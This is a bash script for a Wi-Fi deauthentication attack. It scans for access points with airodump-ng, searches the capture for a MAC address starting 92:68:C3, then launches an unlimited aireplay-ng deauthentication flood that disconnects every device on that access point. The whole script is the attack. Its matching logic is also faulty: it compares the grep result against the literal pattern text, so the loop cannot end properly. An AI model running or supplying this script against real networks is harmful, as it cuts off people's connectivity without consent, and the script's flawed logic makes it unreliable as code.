#!/bin/bash

	ifconfig wlan0 down
	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
	xterm -hold -e airodump-ng -w dump wlan0 & tput setaf 3; echo "Searching for APs...$(tput sgr 0)"	# Scan for APs
	i=true

	while [[ $i == true ]]
	do
		apMAC=$(grep -Eo "92:68:C3:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)	# Search and trim MAC

		if [[ $apMAC == "92:68:C3:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]]
		then
			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
			echo $apMAC
			i=false

		fi	# If MAC not found, search again
	done

	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices


